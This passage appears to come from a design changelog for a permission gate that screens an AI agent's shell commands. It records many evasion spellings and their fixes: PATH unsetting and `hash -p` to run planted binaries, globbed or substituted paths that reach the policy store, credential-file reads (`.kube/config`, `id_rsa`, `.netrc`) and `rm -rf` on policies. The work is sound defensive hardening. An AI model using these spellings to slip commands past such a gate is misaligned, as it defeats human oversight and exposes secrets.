  mistaken for the heredoc, and its body stays unseen and asks. Still open from the same review: a `~` after `=` in a
  word (`body=~/F`) is not yet an expansion to the lexer, so the home-path scrub reads it literally (a privacy nuance,
  not a hidden command; `_expands` is used widely, so it wants its own scoped change).
  *Amendment 2026-10-20 (issue #334, follow-up to #231):* #231 reads values bash runs later as code, and a nest of
  `$(` in one cost about n**4. Each `$( )` is listed at every level above it and classified there again, and nothing
  bounded the depth, so 40 levels in `PROMPT_COMMAND` took 15 s, and from about 500 levels the lexer's recursion
  raised RecursionError. The hook then asked for the whole line, so a deny on a command after the value became an
  ask. *Read once.* One top-level classify_shell call parses each line once and classifies it once per depth and
  state of the brace and store budgets (`_shell_seen`). The budgets only fall, so a line met again after one fell is
  read again and spends it again: every line classifies as before, budget refusals included. A caller gets its own
  copy of the result and shares the parts it was built from (D-075). The ssh hop, the only caller that changes parts
  in place, marks a copy. `decide` scopes and walks each part once, also a part the memo shares among several
  results, so it stays linear in the line too. *A depth cap.* A lexer reads 16 levels of `$( )`, `<( )` and `$(( ))`
  inside one another (`_NEST`). Past them `_nest_end` finds where the nest ends as the lexer would end it, in one
  pass with a stack of open parts and no here-doc body read again, and the line lists an unread part (`opaque_exec`,
  signal `unread nest`). An exported value keeps that part, where export drops other values it cannot read. The
  sources of the levels around hold a short stand-in, so classifying them never reads the deep text again, and a word
  keeps the text the lexer would give it. On 80,000 random texts (3,000 in the test) `_nest_end` ends where the lexer
  ends and leaves the same here-docs waiting. On a wider set it still ends there, but a delimiter word holding
  `$(cat <<X ...)` can leave a here-doc waiting for other text, since the lexer reads that `$( )` as its body. Each
  level around the unread part pairs every here-doc with its end line, also when the delimiter holds that part,
  quoted or not (the line is spelt the way the level reads the delimiter) or the body lies inside it (the stand-in
  ends the body), so a command after the here-doc is still read. A run of stand-in lines, one written by hand too, is
  read in one step, and a command after it is still read. The cost: a command inside the unread part is not read, so
  a deny on it asks, and a here-doc delimiter there longer than 1,024 characters ends no body. With a nested `${..}`
  that holds a `$( )` (#143), a deny after the nest can ask too. *git -c (#335).* #231 widened the keys `git -c`
  flags and kept the early return that made the whole line opaque for one, so
  `git -c include.path=/dev/null push --force origin main` asked where the gate before #231 denied it. A flagged
  key's part now stands beside the subcommand's own category (`_exec_options` already added it), and only an unknown
  subcommand, which the config may define, is opaque on its own. `git config` with a flagged key keeps its
  `local_write` part. Rejected: reading a nested `$( )` only from the level that holds it (each level classified
  once), which would put a `$( )` five levels down past the four-level cap and turn its deny into an ask. Also
  rejected: a scan that follows only quotes and parentheses to the end of the nest, which a quote in a comment or a
  here-doc body leads past the end, past a deny-listed command.
  *Amendment 2026-10-21 (issue #329, follow-up to #231):* `unset PATH; ls` was `read` (allow). With no `PATH`, bash
  looks a command up in the current folder, so the `ls` runs a `./ls` an earlier write can plant. That is the hazard
  #231 reads in an empty `PATH` element. *unset.* `unset PATH` and `unset -v PATH` are read as `PATH=` and ask,
  `opaque_exec` named in the summary. `-f` names functions, and with `-v` it is an error, so `unset -f PATH` stays
  `read`. `-f` counts only from an option word the gate can read, before any word it cannot: in `x=; unset -$x -f
  PATH` bash reads `-` as the end of the options and unsets the variable. A `+x` word ends unset's options, as `--`
  and a name do (`unset +f -f PATH`). Any word the gate cannot read asks, as a name or as an option: a name made by a
  variable or a substitution (`unset "$v"`, `unset -${f}v PATH`), a `$` outside double quotes, which bash may split
  into more names (in `unset a[$i]`, `i='1] PATH ['` splits off `PATH`), a glob (`unset PAT?`, and `unset [P]ATH`,
  whose leading `[` the lexer does not mark), or an unquoted brace (`unset {PATH,}`). A word wholly in double quotes
  is read as before, so `unset "arr[$k]"` keeps its class. `unset -n PATH` asks, to be safe. bash leaves a plain
  `PATH` set under `-n`, but it unsets a `PATH` that an earlier command made a nameref, and the gate does not track
  namerefs. *Exporters.* One helper, `_builtin_options`, now reads the options of unset and of the exporters. export,
  readonly and unset take no `+x`, and a word that may expand ends the options. So `V=PATH; export +x -f $V=; ls` and
  `V=PATH; declare -${f}x $V=; ls`, which were `read` on main and run a planted `./ls`, ask. An option-like word with
  a value the gate cannot read (`declare -x=$v -n r=PATH`) still asks. A `-n` after a `+x` word is a name too, so
  `readonly +x -n r=PATH` makes `r` a plain variable in bash. Main took that `-n` as an option and asked on a nameref.
  The line is `read` now. *Intended asks.* Some new asks fall where `unset` cannot reach a later command: `(unset
  PATH); ls`, `echo x | unset PATH`, `sudo unset PATH`, and `cd /dev && unset PATH`, which is `store_write` for the
  `cd`. Main reads `(PATH=); ls`, `echo x | PATH=` and `cd /dev && PATH=` the same way. A loop over other names (`for
  v in A B; do unset $v; done`) asks, as `export $v=` already does, and so does `unset "${arr[@]}"`, since the array
  may hold `PATH` (the #179 test that pinned it as `read` now pins `unset -f "${arr[@]}"`). An unquoted subscript
  (`unset arr[1]`) is a glob and asks, while `unset 'arr[1]'` stays `read`. A brace with no comma (`unset {X}`) asks
  too. *Policies that allow `opaque_exec`.* The line decides by its most severe part, which is now `opaque_exec`. A
  policy that allows or logs `opaque_exec` but asks on another category loses that ask. Under `categories:
  {opaque_exec: allow, local_write: ask}`, `unset PATH; echo hi > out.txt` goes from ask to allow. Main already allows
  `PATH=; echo hi > out.txt` under that policy, so this follows the design. In the same way, an allow rule that names
  `opaque_exec` now allows `unset a[$i]`, which main asked on for its subscript. Main allows `export a[$i]=1` and
  `read a[$i]` under that rule. The rule also allows a line that asked on main only for another word's indirection,
  once `unset` makes it `opaque_exec` (`unset "arr[$k]" PATH`, `unset $"PATH"`). Main allows `PATH=; unset "arr[$k]"`
  there too. A line with a `$".."` word that is not `opaque_exec` is decided a second time as `opaque_exec` with no
  own text (#136), so no allow rule lowers it. A line that is `opaque_exec` already is decided once. So under
  `categories: {opaque_exec: deny}` with an allow rule for every command, `unset $"PATH"; ls` goes from deny to ask,
  as `export $"PATH"=; ls` and `PATH=; echo $"x"; ls` ask on main. A `deny: [opaque_exec]` entry still denies it, and
  a deny on any part still holds (D-075, #191). Differential (#423) on the final tree, with 3,860 probe lines of unset
  and exporter forms added to the corpus: 28,801 actions x 76 built-in policies, 2,188,876 pairs, lowered 1,246 pairs
  on 246 actions, each in a group above. 472 pairs on 236 actions are the two allow rules that name `opaque_exec`. 84
  pairs, on 42 of those actions (each with a `$".."` word), are the two policies that deny `opaque_exec` by category
  and allow every command by rule. 690 pairs are the 10 `readonly +x -n` actions, 10 of them a reserved entry for
  `opaque_exec` that no longer applies. With 4 mixed category policies: 115,204 pairs, lowered 510 pairs on 343
  actions, 500 of them the mixed category case and 10 the `readonly` lines. No posting violation was lost. Not done:
  an exporter name in a brace (`export {PATH,X}=`) is not read yet (#438). Nor is a `read` or exporter name that
  starts with a glob `[` or a brace (`read [P]ATH`, `read {PATH,}`), as on main. Rejected: matching a brace set's
  words against `PATH`. The brace check the store paths use misses a quoted `}` (`unset {"}",PATH}` unsets PATH), and
  an unquoted `{` is rare in an `unset` line.
  *Amendment 2026-10-22 (issue #329, review of #404):* `unset \<newline>[P]ATH; ls` was `read` (allow). So were its
  `-v` form, `unset FOO \<newline>[P]ATH; ls` and the `git status` form. bash drops the `\<newline>` before it reads
  the word, so the `[` still leads it. In a folder with a file named `PATH`, the glob makes the line `unset PATH`, and
  the `ls` runs a planted `./ls`. The lexer drops the `\<newline>` too, and leaves a leading `[` unmarked as it always
  does. But the leading-`[` check read the backslash. It now drops each `\<newline>` from the word's source first, so
  these lines ask as `unset [P]ATH` does. A quoted `'[P]ATH'` after a `\<newline>` stays `read`. The option checks
  read the lexer's text, which has no `\<newline>`, so `unset \<newline>-${f}v PATH` asked already. The fix only adds
  asks. Differential (#423) against the branch before it, c84ffed5, with 2,100 probe lines added (continuations before
  each kind of `unset` word, under wrappers, compounds, `$( )` and here-docs): 58,385 actions x 87 policies, lowered 0
  pairs, tightened 43,905 pairs on 564 actions. Under 4 mixed category policies (`{opaque_exec: allow, read: ask}`
  and the like) it lowers 558 pairs on 546 actions. Each is one of the new asks, now decided by its `opaque_exec`
  part: the mixed category case above. Against main 39cafcba: 58,388 actions x 87 policies, lowered 580 pairs on 122
  actions, each in a group the amendment above names. 320 pairs are the 4 `readonly +x -n` actions. 202 pairs on 101
  actions are the two allow rules that name `opaque_exec`. 58 pairs on 17 actions are lines with a `$".."` word, under
  those two rules and the two policies that deny `opaque_exec` by category and allow every command by rule. 72 of the
  101 are `unset \<newline>"arr[$k]"` forms. The double-quote check reads the raw word, so a `\<newline>` before it
  makes the word one the gate cannot read, and the line `opaque_exec`, as `unset a[$i]` is. That was so before this
  fix too.
  *Amendment 2026-10-22 (issues #225, #269, #309, #341):* #307 and #305 left store names an expansion still hid, and
  relative names that still reached the run folder. *One reading of an expansion.* `_unknown_forms` (#307) is the one
  place a word's expansions are read, and it now reads more. `$(( ))` and `$[ ]` are substitutions. A substitution is
  `*` at either end of a word too, except at its start with text after it (`$(pwd)/config` is not `*/config`), while
  a variable stays `*` only between literal text, as #307 had it (`cat $f` stays a read). One that starts a name part
  is also `.*`, since output may start with the dot a glob's `*` does not match. The default word of an unknown
  variable (`${x:-word}`, `-`, `=`, `:=`, `+`, `:+`, on an array element too) may be its value (#341). Its forms
  (`_unknown_words`, once per spelling per call) feed the secret-store checks as before, the #192 working-folder
  targets and names, and the Exo-store write checks (#309). There `_unknown_store` checks each form as a path and,
  with a `*`, as a glob matched one part at a time against the protected folders and names (`_store_glob`). Its
  tables come from the list `_STORE_NAMES` is built from, so the bus store and `update/allowed_signers` count (`cp x
  ~/.exo/bu$(printf s)/x`). As for a glob read, a match needs a part with three characters of its own, and a store
  file's name needs them itself, so a store file's folder alone with output for the name keeps its class (`cp x
  src/state/$(basename $f)`, `cp x state/$(date +%F).json`). *Relative names from `$EXO_HOME`.* `_exo_relative`
  (#305) now reads a target spelt with a glob or an expansion as the store folders it could be, below the store's own
  folder too, along each tail of a principal's `principals/<name>/run/jobs` path it fits (`~/.exo/r?n/jobs`,
  `~/.exo/r$(printf u)n/jobs`, `cd r?n/jobs` from the store). A target that fits none is left out. A leading part
  that could be `..` is read as `..` (`.?`, `.$(:).`, after `./` or `.//` too), and a target or name that `..` would
  shorten is read both as `.` and with those parts as `..` (`cd .?/..`, `cd $PWD/.?/..` and `.?/..` from `run/jobs`
  are also `../..`).
  A name that could be the run folder by a glob (`ru?`), or a folder that holds one (`$EXO_HOME` or a `.exo` folder,
  its `principals`, a principal's store), counts as `.` in `$EXO_HOME` already did. *With #464.* The `*` reading
  makes lines that never reach the store `store_write` (`cd /dev && cp x ~/.exo/polic$(date)ies/a`, `ssh host 'rm -rf
  ~/.e$[0]xo/policies'`). Its review found that a matrix cell or a `target:/dev*` entry then stopped deciding them.
  #467 (D-075 amendment) gives each part its own matrix cell in the #191 pass and keeps the descriptor folder as its
  own `store_write` part, and this branch merges it, so those lines keep main's deny. *Privileged wrappers.* Main
  counts what `sudo` or `doas` runs as costly at the line alone, not at the parts it runs over ssh, and a privileged
  wrapper (`chroot`, `nsenter`, `unshare`, `systemd-run`) at its own parts alone, not the ones nested in them. A rule
  on costly parts (gate_diff's `rule_costly_part_deny`, which denies a costly `shell`, `read` or `local_write`
  part) then matched such a line only by the line's category, and once the `*`, default-word or `..` reading made
  the line `credentials` or `store_write` it matched nothing. So, with that rule, `sudo ssh host 'cat ${x}rc'`, `doas
  ssh host 'cat /tmp/$(cat last)'`, `sudo ssh host 'cat ${x:-~/.kube}/config'`, `sudo ssh host 'cp x
  out/schedule$(date +%F).sqlite'`, `sudo ssh host 'cd ~/.exo/run/jobs && cd .?/.. && ls'`, `chroot / bash -c 'cat
  ${x}rc'` and spellings bash never makes a store path (`sudo ssh host 'cp x ~/.exo/poli$[0]cies/gates.yaml'`,
  `doas ssh host 'cp x ~/.exo/polic$(date)ies/a'`) went from deny to ask before this fix:
  everyday lines, secret-store and default-word spellings and the `..` rows alike. `_run_privileged` now adds, beside
  the parts such a wrapper runs, nested ones included, a costly copy of each one that is reversible, so the rule
  matches the command inside and keeps main's deny. It adds and does not rewrite: the parts stay as written, so a
  rule or entry keyed on `reversibility` reaches them as it did on main. An earlier draft of this fix made the parts
  themselves costly, and under a rule that denies a reversible `read` `sudo ssh host 'ls; cat x'` went from deny to
  log (`sudo ssh host 'cat ~/.kube/config'` from deny to ask), and under `read: deny` lifted by a rule that allows a
  costly `read` the first line went from deny to allow. Both deny now, as on main. A copy holds no parts and no
  post, so the posting checks read each post once. It carries the part's (category, target), so reserved entries
  list the same parts. None is made where a costly part a rule cannot tell from it is already there (a wrapper
  inside a wrapper), so the work stays linear. The line itself is costly, as on main. Main's unsplit lines had the
  same gap (`sudo ssh host 'cat ~/.kube/config'` and `sudo ssh host 'cp x ~/.exo/policies/a'` asked under that
  rule), and they deny now too. What `sudo` runs through a shell keeps main's decision under a rule on costly parts:
  `_run_privileged` does not reach the parts of the `-c` text, so `sudo bash -c 'cat ${x}rc'` (now `credentials`,
  `opaque_exec` on main) asks under it, as it did on main. Rejected: a second
  mechanism here for what #467 does, keeping the first draft's second reading of substitutions (a `cuts` list on each
  lexed word, and a run-folder state machine in `_cd_store_read`) beside #307's and #305's, which would have been two
  mechanisms for each thing, and asking for any expansion in a path-like word, which would ask on `cat notes$(date
  +%F).txt`. *The cost, failing closed.* These ask: `cd ~/.kube && echo $(date)` (a word that is a substitution alone
  in a store folder), `cd ~/.exo && ls principals`, in `run/jobs` `ls ../..` and `cat $(ls)`, `cat ${x}rc` (`.*rc`), a
  read of a folder that holds a store by a name made by output (`cat /tmp/$(cat last)`, `ls ~/.config/$(whoami)`,
  as `cat /tmp/*` does on main), `cat ${x:-'~/.kube'}/config`, a name whose own text fits a store file (`cp x
  data/schedule$(date +%F).sqlite`, `cp x out/seat$(date +%F).json`) and a split spelling bash never makes a store
  path (`cp x ~/.exo/polic$(date)ies/a`). A write to `keys/` that only the `*` reading reaches is `store_write`
  rather than `credentials`. A long write line full of expansions costs 2 to 3 times the CPU time it did, and the
  work stays linear. *Differential* (#423), main's `scripts/gate_diff.py --jobs 2 --timeout 0`, base main 77274ab9,
  head this branch, the built-in corpus plus an aimed corpus of 64,080 lines: 13 store paths and 11 store folders
  through each expansion form read here, under 12 write, read and delete commands, plain, after `cd /dev` or `cd
  /proc/self/fd` and in `ssh host '...'`, then `cd`, `tar -C` and `git -C` into each folder spelling with 14 relative
  names, 100 everyday lines, and 13,696 of these lines again under a privileged wrapper (`sudo ssh host`, `doas ssh
  host`, `sudo -u bob ssh host`, `sudo env ssh host`, `sudo timeout 5 ssh host`, `chroot / ssh host`, `sudo bash -c`,
  `chroot / bash -c`). Two policy sets were run. The 87 built-in policies: 238,606 actions, 20,758,722 pairs, no
  outcome lowered, tightened 3,347,304 pairs on 111,822 actions. 57 policies keyed on `reversibility` (`--only-policies
  --policies`), for each of `read`, `shell`, `local_write`, `credentials`, `store_write`, `opaque_exec` and
  `web_post` and each of `reversible`, `costly` and `irreversible`: a rule that denies that category at that
  reversibility, and a category line that denies it lifted by a rule that allows it at that reversibility; and for
  each reversibility a rule that denies any category, a deny on all seven lifted by a rule that allows any, a matrix
  row that denies, and deny and reserved entries for the seven. Result: 238,306 actions, 13,583,442 pairs, no outcome
  lowered, tightened 2,115,920 pairs on 197,156 actions. So no outcome is lowered under either set; other policy
  shapes were not run. Both runs count reserved entries lost at the same outcome, and in each case the line still
  asks, reserved for the principal: the remote read in `ssh host '...'`, a `read` part with target `host` on main, is
  a `credentials` part with the path or `../..` as its target here, so the entry lists one part fewer wherever no
  other part makes up the count. Under the built-in `reserved_tool_terminal`, 32 pairs on 32 actions: any line whose
  other parts add a sixth reserved entry around a `jo$(:)bs ... .?/..` remote read, five parts where main lists six
  (`chroot / ssh host 'cd ~/.exo/run/jo$(:)bs && grep -r x .?/..'`, and the same remote read beside `sudo`, `xargs`,
  `find -exec`, `flock`, `unshare`, `systemd-run`, `nsenter`, `coproc` or a redirect, which the corpora do not hold).
  Under the reserved entry for a reversible `read`, 52 pairs on 52 actions: a remote read of a store file or key
  spelt with an expansion (`ssh host 'cat ~/.exo/$(printf ledger.sqlite)'`, `ssh host 'cat ~/.e$[0]xo/keys/seat'`,
  alone or beside `true`, a pipe, `$( )` or a `cd`), two parts where main lists three. Both groups come from the
  `*` and `..` readings above, not from the privileged-wrapper copies: df22ec97, before them, lists the same parts.
  An earlier draft of this fix, which made the parts themselves costly, gave no lowered pair under the 87 built-in
  policies with the same command, and against #467's head 9446c8af it lowered only those 32 pairs and 436 pairs on
  50 actions from main's #329 `unset` and `readonly +x -n` changes, which 9446c8af predates.
  *With #468, #439 and #440 (2026-10-25, merged at main d79639f1).* #468 (the #465 amendment above) reads a `$( )`,
  backticks or `<( )` after a `cd` into the store in that folder, and gives a relative key read on such a store-write
  line a `credentials` part with the line's weight and the key's name as its target. Here the word that is such a
  substitution alone (`echo $(cat ../keys/seat; rm -rf x)`) is a name too, `*`, and `_cd_store_read` returned the
  first name it met, so that part's target became `*`: under `rules: [{match: {target: '*keys*', reversibility:
  irreversible}, decision: deny}]`, `cd ~/.exo/state && echo $(cat ../keys/seat; rm -rf x)` and `cd ~/.exo/state &&
  x=$(cat ../keys/seat) && echo $(rm -rf x)` asked where main denies. The same reading took other targets main reads:
  `..` before `../run` (`cd ~/.exo/state && grep -r x .. ../run` under a rule on `*run*`), `*` before `keys/seat` (`cd
  ~/.exo && cat $(ls) keys/seat`), and on a line that a name main reads as no secret now makes `credentials` (`cd
  ~/.exo/state && cat ${x-.env} ../keys/seat`, `cat id_ed$((25519)) ../keys/seat`), the store read was not looked for
  at all. `_cd_store_read` now reads a line twice from one walk, with one store test per folder: first with the words
  as written and none of the readings above (no form of an expansion, no `..` reading of a glob, no folder that holds
  a run folder), as main reads it, on a join budget of its own, and that name decides the line and builds its parts as
  on main (#464, #468); then with them, and a name that is another target is a `credentials` part of its own beside
  the line. Nothing replaces or retargets a part main builds. On a line a secret already decides, the name read as
  written is such a part too when it is another target, and so is the secret the line's own words name
  (`_shell_credential_hit`, main's target where nothing else read a secret): the ssh remote command in `chroot / ssh
  host 'cd ~/.exo/run/jo$(:)bs && grep -r x .?/..'`, which the `..` reading makes a secret line, keeps main's part on
  the remote text, so a reserved entry on `target:*run*` lists it, and so does the built-in `reserved_tool_terminal`
  (the 32-pair group above lists six parts again). Where these forms make an ssh remote line a secret or store line,
  the part that decided that line before is also kept with the host as its target, as the remote line itself had it on
  main (`ssh host 'cat ~/.exo/$(printf ledger.sqlite)'` was a read of `host`): a copy with no parts and no post, so
  the posting checks read each post once, and the 52-pair group above lists three parts again. Beside a secret line
  such a part weighs as a secret read (costly), with a heavier command deeper in it beside it (`weigh`), so `cd
  ~/.exo/state && cat ../keys/seat; echo $(cat ${x-.env}; rm -rf x)`, a store write with a costly key read on main and
  a secret line made irreversible by the delete here, still denies under a rule on costly `credentials`. Five of
  #468's control rows and two of its order rows are stricter here, by the cost below, and its tests say so: `cd
  ~/.exo/policies && echo $(ls)`, `echo $(cat gates.yaml)` and `git log -n1 $(git rev-parse HEAD)` there, `cd ~/.exo
  && echo "$(ssh prod 'ls /srv; sort /srv/x')"` and `echo $(cp /tmp/evil gates.yaml); cd ~/.exo/policies` are
  `credentials` (ask) where #468 has `read`, and so are `pid=$(docker inspect -f '{{.State.Pid}}' web); cd /proc/$pid
  && cat status` and `V=$(sed -n 1p VERSION); cd ~/.exo && ls`. Each is a word that is a substitution alone, or a
  value set by one, on a line that enters a store folder. This reading does not follow the line's order, as main does
  not for any name (it reads `echo *; cd ~/.exo/policies` and `V=*; cd ~/.exo && ls` as `credentials`), and a value
  set before the `cd` may be used after it. #468's rule holds for the commands in them: none is a store write, and an
  `ssh` remote command keeps its own folder (`cd ~/.exo && ssh prod 'cd /srv && echo $(ls)'` and `cd ~/.exo && diff a
  <(ssh prod 'ls /srv; sort /srv/x')` stay reads). #440 makes `plugins/` a protected folder, and `_store_glob` takes
  its folders from `_HOME_PROTECTED`, so each form above reaches `~/.exo/plugins/` as it reaches `policies/` (`cp x
  ~/.exo/plug$(:)ins/foo/__init__.py`, `cp x ${x:-$HOME/.exo}/plugins/foo/x.py`, `tar -C ~/.exo/plug$(:)ins -xf
  evil.tar`): on 27 spellings under 12 commands, 4 wrappers and 6 folder commands (1,458 lines per folder), each
  `plugins/` line has the class and default outcome of its `policies/` line. The #435 amendment's remaining group (a
  costly rule on a write or send under `sudo` or `doas` over `ssh`) denies again through `_run_privileged`'s copies.
  #439's readings of a gh line (`alt_targets`, merged in `decide`) are not touched; its test lines are in the runs
  below. *With #452, #489, #492, #520, #548, #549 and #541 (2026-10-25, merged at main edeb4f89).* #452 (the #311
  amendment below) reads a shell call's own folder argument as a `cd` there, with `_cd_store_read`. On the merge that
  call read the forms above alone, so the `*` of a word that is a `$( )` alone was the first name it met and the
  folder's part took `<folder>/*` as its target: `echo $(cat config)` with `~/.kube` or `/proc/self` as `cwd` asked
  under a rule or a `deny` entry on `*config*` or `*environ*` where main denies, and so did `tar czf - $(ls) ../keys`
  with `~/.exo` as `cwd` under one on `*keys*`, whose reserved hit was lost too. And `_shell_call` added no folder
  part to a line that reads a secret itself, so a line these forms make a secret line (`cat ${x-.netrc}; echo $(git
  push --force origin main)` with `~/.exo/keys` as `cwd`, a force push with the folder's part on main) lost the part
  on `~/.exo/keys`, and with it a deny or reserved entry on that target or on the push. `_tool_folder_read` now reads
  as a `cd` line does: the words as written first, whose name builds the part as on main, then with the forms, whose
  name is a second `credentials` part beside it when it is another target. The folder's read is a part beside any
  line that reads a secret, when it names another target, as beside a `cd` form's secret line. That lifts the #311
  amendment's limit on such a line: `cat id_rsa` with `~/.ssh` as `cwd` is denied by `deny: [target:*/.ssh]`, as
  its `cd` form is, where main asks, and #452's rows for it now say so. These reads are made beside the #209 one too
  (a word that resolves into a store from the folder), which these forms alone can make: `cat ${x-.env} keys` with
  `~/.kube` as `cwd` keeps its part on `~/.kube/keys`. On a secret line the folder adds a part to, a copy of its
  heaviest other command with no own text is a part as well, so a rule keyed on `command` does not lift that
  command's category or matrix deny, as on main, where that command decides the line and the folder's part has no
  own text (#394): `cat ${x-.netrc}; echo $(git push --force origin main)` with `~/.exo/keys` as `cwd` stays denied
  under `force_push: deny` and an allow rule on `.*`. The copy keeps its body (its text, or one the gate cannot
  read), so a post there is checked as often as on main, which in a folder that is itself a store checks it as the
  line's own and as its part: `cat ${x-.env} config; gh pr comment 3 --body hi` with `~/.exo/keys` as `cwd` lists its
  footer violation twice, each named after the post, where the merge listed it once. The copy is the line's first
  part, so on a line of more than 20 posts (`_LISTED_VIOLATIONS`) its entry is listed before the cap, where main lists
  the line's own bare: with 25 posts in `~/.exo/keys`, 21 entries and `and 5 more` on both, where the merge listed 20
  and `and 6 more`. Its entries take none of the 20 places (`line_copy`), so posts with no numbered target, which have
  no #399 copies and share those places (`gh pr comment --body hi`, `gh issue create`, `gh pr review --comment`), list
  at least as many entries as main and leave as many out, where d6104e80 left one more out. A here-doc body on the line
  reaches the most severe post below a secret read and a store write,
  as below a store write (#435), so a line these forms make a secret line keeps the posting checks main makes on its
  post (`cat ${x-.netrc}; mail -s s a@b.c <<EOF`, in any folder, where the merge checked none). The literal line
  (`cat .netrc; mail -s s a@b.c <<EOF`) now has them too, where main checks none. #452's nested-line row is stricter,
  by the cost below: a 12-level `echo x y z $( ) w` with `~/.kube` or `~/.exo/work` as `cwd` has a `credentials` part on
  `<folder>/*` and asks, as after a `cd` there, where main reads it as an allowed `read`. #489's store-write readings
  (`gate.readings`, `no_grant`, `call_approvers`), #492's `sudo` write redirections, #520's ssh stdin, #548's Codex
  `Move to`, #549's escalation checks and #541 are not touched; the test lines of #452, #489, #492 and #520 are in
  the runs below. *Differential against main edeb4f89* (main's `scripts/gate_diff.py --jobs 2 --timeout 0`, base
  main edeb4f89, head this branch; the work folder and the shared HOME were in a scratch folder under `/tmp`): (a)
  the built-in corpus with its variants under the 87 built-in policies: 73,198 actions, 6,368,226 pairs, none
  lowered (outcome, reserved or posting violation), 36,703 pairs tightened on 905 actions, and 279 pairs reworded
  (a post's violation named after its post, as below). (b) `--only-corpus --no-variants` under 182 policies (the 87
  built-in ones, the 57 keyed on `reversibility` above, and 38 keyed on targets: #468's four, a costly-cell matrix, a
  rule and a deny entry on each of 15 store names such as `*keys*`, `*run*`, `*plugins*` and `*netrc*`, and reserved
  entries on `*keys*`, `*run*` and `*plugins*`). On the 92,416 distinct lines of the earlier aimed corpora (the 64,080
  of round 4; round 6's #468 shapes, test literals and #341 default words beside a key or run read), run in two
  halves: 92,416 actions, 16,819,712 pairs, none lowered, 2,903,875 pairs tightened on 45,255 actions, and 100 pairs
  reworded: a footer violation of a gh post in a `$( )` before the `cd` (`echo $(gh pr comment 3 --body hi); cd
  ~/.exo/state`) is named after its post, since the line is `credentials` here. On 14,480 more actions (the test lines
  of #468, #440, #439, #452, #489, #492 and #520 and the #320 test files, harvested by gate_diff's own reader, 13
  approval-binding lines, 3,817 #468 shapes into `policies/`, `state/`, `plugins/` and `keys/` with this branch's
  spellings of the folder, and the 5,808 store-name forms on `policies/`, `plugins/`, `state/` and a principal's
  `policies/`): 2,635,360 pairs, none lowered, 458,774 pairs tightened on 6,296 actions, and 120 pairs reworded as
  above. On 79,749 shell calls with their own folder argument or a here-doc post (the `cd <folder> && <rest>` lines
  of those corpora as `cwd` and `workdir` calls, #320's forms beside a relative store read and a heavier command in
  the store's folders, the review's 7,412 calls, 19,872 calls that put a gh post beside these forms or a literal
  secret, in 10 folders, `~/.exo`, `~/.exo/keys` and `~/.ssh` among them, and 6,768 calls of 378 lines that put a
  here-doc post (`mail`, `sendmail`, `gh --body-file -`) beside them and 48 lines of 21 or 25 gh posts, plain and in
  6 folders, as bash, terminal and exec_command calls): 14,514,318 pairs, none lowered, 1,138,879 pairs tightened on
  41,216 actions, and 193,080 pairs reworded, each a post's violation on a line these forms make `credentials`,
  named after its post as above. On a later review's 16,632 posting calls (lines of up to 25 posts and here-doc
  mail beside these forms, in store folders and `/tmp`) under the 87 built-in policies: 1,446,984 pairs, none lowered,
  34,232 pairs tightened on 6,424 actions, and 163,980 pairs reworded as above. Before the
  #452 fix above, the merge with edeb4f89 lowered 8 pairs of the test lines and 26,717 pairs on 2,975 of those
  calls; before the copy kept its body, 1,480 posting pairs on 148 of the gh-post calls (a violation main lists
  twice in a folder that is itself a store, listed once); and before the here-doc and listing fixes above, the
  review's posting calls lowered 3,438 posting pairs on 846 actions (2,250 a here-doc mail beside these forms,
  1,188 a line of more than 20 posts in a store folder); against main d79639f1 the earlier runs lowered none. Before the
  fixes of this paragraph, round 6's aimed run on the merge with main 5a9dc394 lowered 128 outcome pairs under the
  target rules, and with the first of them alone the 11,845 actions still lowered 9 pairs (the `${x-.env}` key-read line
  above under a rule on costly `credentials` and under a lifted category line, and the reserved groups). Now no run
  lowers a pair, and neither the 32-pair nor the 52-pair reserved group remains.
  *Known limits.* The default word is not read behind an indirect name or a subscript with an expansion in braces
  (`${!x:-~/.kube}`, `${!x[0]:-.env}`, `${x[${i}]:-$HOME/.exo}`), and a part that could be `..` after a literal part
  is not read as `..` (`grep -r x ~/.exo/run/jobs/.?`). A secret read beside a store write makes the line
  `credentials`, as on main (`cd ~/.exo/state && cat .netrc; echo $(rm -rf x)`), so a line that these forms make a
  secret line (`cd ~/.exo/state && cat ${x-.netrc}; echo $(rm -rf x)`, a store write on main) is `credentials`
  too. It asks and denies where main does, and since #447 its store write part keeps the answer with the principal
  alone, as for the literal line. Any line these forms make `credentials` is answered by those who may answer
  `credentials`, as the literal line is on main: `call_approvers` narrows that list only by the other `NO_GRANT`
  categories among its parts, so a seat that may answer `credentials` and not `force_push` may answer `cat
  ${x-.netrc}; echo $(git push --force origin main)`, a force push on main. Narrowing it by each part's category is
  a possible follow-up. The other limits are in `docs/GATE.md` "Other spellings of
  a store path", "In `$EXO_HOME`" and "The store is credentials".
  *Amendment 2026-10-22 (issue #330, PR #409):* `hash` is on the read list, but `hash -p PATH NAME` makes the shell run
  PATH for every later NAME, so `hash -p /tmp/x ls; ls` read as a plain `ls` and ran the file. A `hash` call that binds
  a name is now `opaque_exec`, with the path as its target and a card naming the rebound program. Its options are read
  as bash reads them: a cluster (`-dp`), an attached path, options after the path, and the last of several `-p`. A name
  with a slash binds nothing, since bash skips it. An option word the gate cannot read may hold `-p`, so it is opaque
  too, except one double-quoted word at the end (`hash "$cmd"`), which has no name after it. From the path on, such a
  word may hold a name. It may split into a path and a name (`hash -p $P` with `P='/tmp/x ls'`, or `hash -p *`),
  unless it is one double-quoted word. As a name it may lose its slash: bash runs `hash -p /tmp/x {ls,/}` as
  `hash -p /tmp/x ls /`, skips `/` and binds `ls`. So each is opaque. A glob keeps a slash it has, so
  `hash -p /tmp/x*` binds nothing. Setting `BASH_CMDS`, the
  table `hash -p` fills, or `BASH_ALIASES` is opaque, like the variables of #231. *No store write.* `hash -p` and a
  `BASH_CMDS` or `BASH_ALIASES` value record a path and open nothing. Their `opaque_exec` part is marked (signal
  `rebinds a name`), and the store check takes a marked part as the `read` it was, whatever runs or sets it: the shell,
  sudo, ssh, mosh, an ssh `ProxyCommand`, `man -P`, `printf -v` or `declare`. A line that ssh, mosh, `man -P`, less or
  more runs counts so when its other commands are reads or marked parts, and the hop of the ssh or mosh that runs it
  counts too. Any other command keeps the check of the words around the line, in either order: a plain shell command
  (`ssh host 'sort x; hash -p /x ls'`), one run with sudo, or a login to another host (`ssh a 'ssh b; hash -p /x ls'`).
  So a store or descriptor path in these words alone makes no
  store write. This matters because a store write outranks a post on the line: the line then asks
  the principal alone, and an allow, log or ask cell reads the store write only (#437). The first draft checked the hash
  part's words, so a descriptor path in them turned a matrix deny on the post into an ask and dropped its posting
  violations (main has read a deny cell on every part since #464). The second draft exempted only a simple command named
